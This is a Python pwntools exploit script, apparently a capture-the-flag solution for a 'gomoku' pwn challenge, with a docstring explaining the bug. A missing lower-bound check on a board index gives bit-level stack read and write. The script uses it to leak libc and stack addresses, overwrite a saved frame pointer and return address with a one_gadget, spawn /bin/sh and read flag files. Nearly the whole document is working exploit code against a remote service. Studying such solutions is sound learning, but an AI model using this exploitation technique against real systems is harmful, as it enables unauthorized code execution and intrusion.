#!/usr/bin/env python3
"""
gomoku - vuwCTF 2026 pwn solution

Bug: run_game() checks `row > 15 || col > 15` but never checks the lower
bound, so idx = row*16 + col (computed in 64-bit arithmetic) can be driven
deeply negative. That gives a *bit-granular* arbitrary read/write/clear
primitive relative to the stack address of `g.side[turn]`:

    3) peek   -> read  1 bit  (bb->cells[limb] >> bit) & 1
    1) place  -> OR    1 bit  bb->cells[limb] |=  (1 << bit)   [flips turn]
    2) remove -> AND   1 bit  bb->cells[limb] &= ~(1 << bit)   [turn unchanged]

Because only the upper bound is checked, idx can only go very negative, i.e.
we can only reach addresses *below* &g on the stack - never above it. That
rules out overwriting main()'s own return address (which sits above &g),
and it also puts libc/the binary itself out of reach (they live many
terabytes away from the stack under ASLR - well beyond what a 32-bit
row/col can express as a byte offset).

What *is* reachable and useful, a few dozen/hundred bytes below &g:
  - run_game()'s own saved return address (into main)      @ &g - 8
  - run_game()'s own saved RBP (popped by its `leave`)      @ &g - 16
  - leftover pointers that scanf/fprintf's internals leave behind on the
    stack from previous calls - these are 100% deterministic across runs
    (same code path every time) even though their *values* change with
    ASLR. Two of them are used here as our address leak:
      &g - 56  ==  libc_base + 0x2045c0   (glibc 2.39, stable internal ptr)
      &g - 88  ==  &g                     (a self-referential leftover arg)

Exploit:
  1. Leak libc_base and &g (bb_black) via the offsets above (peek, 64 bits
     each, batched into one send to dodge remote latency).
  2. Overwrite run_game's saved RBP with (&g + 0x98) and its return address
     with a one_gadget (libc+0xef52b: execve("/bin/sh", rbp-0x50, [rbp-0x78])).
       - one_gadget needs rax == NULL: true for free, since the instruction
         right before `leave;ret` is the canary check `sub rax, fs:0x28`,
         which leaves rax == 0 when the canary matches.
       - one_gadget needs [rbp-0x78] == NULL: satisfied by pointing our
         controlled RBP so that rbp-0x78 lands on g.side[WHITE].cells[0],
         which is always zero (we never place a White stone).
     Both writes land on the two "quiet" offsets above (-8/-16) - nothing
     else ever touches them, so the bits stick.
  3. choice=4 (resign) makes run_game() `leave; ret` into the one_gadget.

No ROP chain is needed, and the *real* board cells are never touched, so
there's no risk of accidentally completing a five-in-a-row mid-write (the
original approach of stashing a ROP chain in the real board cells has a
~45% chance of prematurely triggering has_five() and ending the game -
see WRITEUP.md).

Usage:
    python3 solve.py            # connect to the remote instance
    python3 solve.py --local    # spawn & exploit ./gomoku locally (for testing)
"""
from pwn import *
import sys
import re
import time

context.log_level = 'info'
context.arch = 'amd64'

HOST = 'gomoku.challenges.2026.vuwctf.com'
PORT = 9971

LOCAL = '--local' in sys.argv

# --- one_gadget (libc.so.6, glibc 2.39) ---------------------------------
# 0xef52b execve("/bin/sh", rbp-0x50, [rbp-0x78])
# constraints: address rbp-0x50 is writable
#              rax == NULL
#              [[rbp-0x78]] == NULL || [rbp-0x78] == NULL || [rbp-0x78] is a valid envp
ONE_GADGET_OFF = 0xef52b
LIBC_LEAK_TO_BASE = 0x2045c0   # &g-56 leftover pointer == libc_base + this

# --- stack offsets, all relative to bb_black = &g -----------------------
LIBC_LEAK_OFF = -56    # leftover pointer -> libc_base + LIBC_LEAK_TO_BASE
BBBLACK_LEAK_OFF = -88  # leftover pointer -> &g itself
RETADDR_OFF = -8       # run_game's saved return address (into main)
SAVEDRBP_OFF = -16     # run_game's saved rbp (becomes RBP right before `leave;ret`'s `ret`)


def idx_to_rowcol(idx):
    """Inverse of idx = row*16 + col using floor division (row/col can be negative)."""
    row = idx // 16
    col = idx - row * 16
    return row, col


def make_idx(byte_off, bit):
    limb = byte_off // 8
    return limb * 64 + bit


class Game:
    """Thin wrapper around the gomoku protocol implementing the bit-level
    read/write primitive, with batching so we don't pay a network
    round-trip per bit against the remote server."""

    def __init__(self, io):
        self.io = io
        self.turn = 0  # 0 = BLACK, 1 = WHITE (place stone toggles this)
        self.io.recvuntil(b'Black player, enter your name: ')
        self.io.sendline(b'AAAA')
        self.io.recvuntil(b'White player, enter your name: ')
        self.io.sendline(b'BBBB')
        self.io.recvuntil(b'> ')

    def _adjust(self, byte_off_black):
        """&g varies with whose turn it is (side[BLACK] vs side[WHITE] are
        32 bytes apart), so re-express a fixed target address relative to
        whichever side is currently 'bb' in the running process."""
        return byte_off_black if self.turn == 0 else byte_off_black - 0x20

    def leak_qwords_batch(self, byte_offs):
        """Read several 64-bit values (peek only, never touches turn)."""
        assert self.turn == 0
        blob = b''
        for off in byte_offs:
            off_adj = self._adjust(off)
            for bit in range(64):
                idx = make_idx(off_adj, bit)
                row, col = idx_to_rowcol(idx)
                blob += b'3\n' + f"{row} {col}\n".encode()
        self.io.send(blob)

        total_bits = len(byte_offs) * 64
        results = []
        buf = b''
        while len(results) < total_bits:
            buf += self.io.recv(timeout=30)
            results = re.findall(rb'cell \((-?\d+),(-?\d+)\) = (\d)', buf)
        self.io.recvuntil(b'> ', timeout=5)

        bitvals = [int(b) for (_, _, b) in results[:total_bits]]
        vals = []
        for i in range(len(byte_offs)):
            v = 0
            for bit in range(64):
                v |= bitvals[i * 64 + bit] << bit
            vals.append(v)
        return vals

    def write_qwords_batch(self, off_value_pairs):
        """Write several 64-bit values. Since place/remove don't depend on
        server feedback, the whole command sequence (including the turn
        flips caused by every 'place') can be precomputed locally and sent
        as one blob."""
        cmds = []
        for byte_off_black, value in off_value_pairs:
            for bit in range(64):
                desired = (value >> bit) & 1
                off_adj = self._adjust(byte_off_black)
                idx = make_idx(off_adj, bit)
                row, col = idx_to_rowcol(idx)
                if desired:
                    cmds.append(f"1\n{row} {col}\n")
                    self.turn ^= 1
                else:
                    cmds.append(f"2\n{row} {col}\n")
        self.io.send(''.join(cmds).encode())
        time.sleep(0.05)

    def resign(self):
        self.io.sendline(b'4')


def main():
    if LOCAL:
        io = process('./gomoku')
    else:
        io = remote(HOST, PORT)

    g = Game(io)

    log.info("leaking libc base + &g (stack) ...")
    t0 = time.time()
    libc_leak, bb_black = g.leak_qwords_batch([LIBC_LEAK_OFF, BBBLACK_LEAK_OFF])
    libc_base = libc_leak - LIBC_LEAK_TO_BASE
    log.success(f"libc_base = {hex(libc_base)}   &g = {hex(bb_black)}   ({time.time()-t0:.1f}s)")

    one_gadget = libc_base + ONE_GADGET_OFF
    rbp_value = bb_black + 0x98  # so that [rbp_value - 0x78] == g.side[WHITE].cells[0] == 0
    log.info(f"one_gadget = {hex(one_gadget)}   rbp_pivot = {hex(rbp_value)}")

    log.info("overwriting run_game()'s saved RBP + return address ...")
    t0 = time.time()
    g.write_qwords_batch([(SAVEDRBP_OFF, rbp_value), (RETADDR_OFF, one_gadget)])
    log.success(f"writes sent ({time.time()-t0:.1f}s)")

    try:
        io.recv(timeout=2)  # drain queued board output
    except Exception:
        pass

    log.info("choice=4 (resign) -> run_game() leave;ret -> one_gadget")
    g.resign()
    time.sleep(0.5)

    io.sendline(b'cat flag* /flag* /app/flag* 2>/dev/null || '
                b'find / -maxdepth 3 -iname "*flag*" -exec cat {} \\; 2>/dev/null')
    time.sleep(1.5)
    try:
        print(io.recvrepeat(timeout=5).decode(errors='replace'))
    except Exception:
        pass

    io.interactive()


if __name__ == '__main__':
    main()
